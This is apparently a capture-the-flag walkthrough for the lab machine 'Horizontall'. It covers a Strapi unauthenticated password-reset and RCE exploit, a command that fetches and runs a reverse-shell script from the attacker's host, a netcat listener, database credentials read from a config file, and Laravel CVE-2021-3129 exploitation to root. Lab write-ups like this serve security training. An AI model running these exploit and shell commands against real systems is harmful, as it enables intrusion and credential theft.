## Info
---

### Credential
 User    | Password | Service | Note
---------|----------|---------|------
admin    |(reset)   |strapi   |
developer|#J!:F9Zt2u|MySQL    |


## Path
---
### User 
---
1. When visiting `http://10.10.11.105/`, we were redirected to `http://horizontall.htb`, so add that to `/etc/hosts`.
2. Ran `gobuster` and got ban, whoops!
3. From the icon of the website and the source code, I guessed that the website is built using Vue.
```
# HTML
 <body>
     <noscript><strong>We're sorry but horizontall doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></no    script>
     <div id="app"></div>
     <script src="/js/chunk-vendors.0e02b89e.js"></script>
     <script src="/js/app.c68eb462.js"></script>
 </body>

# JS
y = {
    name: "App",
    components: {
        Navbar: v,
        Home: w
    },
    data: function() {
        return {
            reviews: []
        }
    },
    methods: {
        getReviews: function() {
            var t = this;
            r.a.get("<http://api-prod.horizontall.htb/reviews>").then((function(s) {
                return t.reviews = s.data
            }))
        }
    }
}
```
4. From `app.c68eb462.js`, I recovered the base64 encoded image to `b64-img.png`, it was a GitHub icon.
5. From `app.c68eb462.js`, I found the API URL.
```
getReviews: function() {
    var t = this;
    r.a.get("<http://api-prod.horizontall.htb/reviews>").then((function(s) {
        return t.reviews = s.data
    }))
}
```
6. Added the API subdomain to `/etc/hosts`, then try to request to the API.
```
$ curl http://api-prod.horizontall.htb/reviews| jq
[
  {
    "id": 1,
    "name": "wail",
    "description": "This is good service",
    "stars": 4,
    "created_at": "2021-05-29T13:23:38.000Z",
    "updated_at": "2021-05-29T13:23:38.000Z"
  },
  {
    "id": 2,
    "name": "doe",
    "description": "i'm satisfied with the product",
    "stars": 5,
    "created_at": "2021-05-29T13:24:17.000Z",
    "updated_at": "2021-05-29T13:24:17.000Z"
  },
  {
    "id": 3,
    "name": "john",
    "description": "create service with minimum price i hop i can buy more in the futur",
    "stars": 5,
    "created_at": "2021-05-29T13:25:26.000Z",
    "updated_at": "2021-05-29T13:25:26.000Z"
  }
]
```
7. Visiting `http://api-prod.horizontall.htb/admin`, it was a login page and the title read "strapi", which was a "Open Source Nodes.js Headless CMS". Searched on `searchsplot`, it showed  we might be able to reset the password of admin account and get RCE.
```
$ searchsploit strapi
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                                                                  | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                                                | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                          | multiple/webapps/50239.py
```
8. When playing, the password had already been reset to `admin` by another player, so I guessed the credential and only needed to ran the RCE script.
```
$ python3 50238.py 'http://api-prod.horizontall.htb' 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwOTE4MjQ0LCJleHAiOjE2MzM1MTAyNDR9.6EhNcUkTStrJ-FNZOGyVdTSlWV5j0dMZNyuN6tVTCyo' 'curl 10.10.17.233:8000/rev.sh -o /tmp/a' 10.10.17.233
$ python3 50238.py 'http://api-prod.horizontall.htb' 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwOTE4MjQ0LCJleHAiOjE2MzM1MTAyNDR9.6EhNcUkTStrJ-FNZOGyVdTSlWV5j0dMZNyuN6tVTCyo' 'sh /tmp/a' 10.10.17.233

$ nc -lvnp 13337
Listening on 0.0.0.0 13337
Connection received on 10.10.11.105 37378
bash: cannot set terminal process group (1783): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$
```
9. At the bottom left of the admin panel of strapi, it wrote `Powered by Strapi v3.0.0-beta.17.4`, so we can confirm it was affected. 

10. The user flag was readable by all users, so got the user flag. (After I reset the box, the permissino didn't change, so maybe it was intended ?)

### Root 
---
1. Found MySQL credential at `/opt/strapi/myapi/config/environments/development/database.json`.
```
strapi@horizontall:~/myapi/config/environments/development$ cat database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}
```
2. `http://127.0.0.1:8000` was running `Laravel v8`.
```
strapi@horizontall:/etc$ netstat -l
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 localhost:8000          0.0.0.0:*               LISTEN
...
strapi@horizontall:/etc$ curl 127.0.0.1:8000
...
<div class="ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0">
        Laravel v8 (PHP v7.4.18)
</div>
```

3. Since it showed the stack trace, Laravel was running in debug mode.
```
strapi@horizontall:/etc$ curl 127.0.0.1:8000/profiles
...
#49 /home/developer/myproject/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
#50 /home/developer/myproject/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(141): Illuminate\Pipeline\Pipeline-&gt;then()
#51 /home/developer/myproject/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\Foundation\Http\Kernel-&gt;sendRequestThroughRouter()
#52 /home/developer/myproject/public/index.php(52): Illuminate\Foundation\Http\Kernel-&gt;handle()
#53 /home/developer/myproject/server.php(21): require_once('/home/developer...')
#54 {main}
-->
</body>
</html>
```
4. Laravel before version 8.4.2 was vulnerable to CVE-2021-3129, so I found the [script](https://github.com/ambionics/laravel-exploits
) on GitHub, then modified it to compat with `python3.6` and ran it to get the root flag.
```
$ php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 sysytem id

strapi@horizontall:/tmp/.a$ python3 laravel-ignition-rce.py http://127.0.0.1:8000/ /tmp/.a/exploit.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
uid=0(root) gid=0(root) groups=0(root)
--------------------------
+ Logs cleared
```
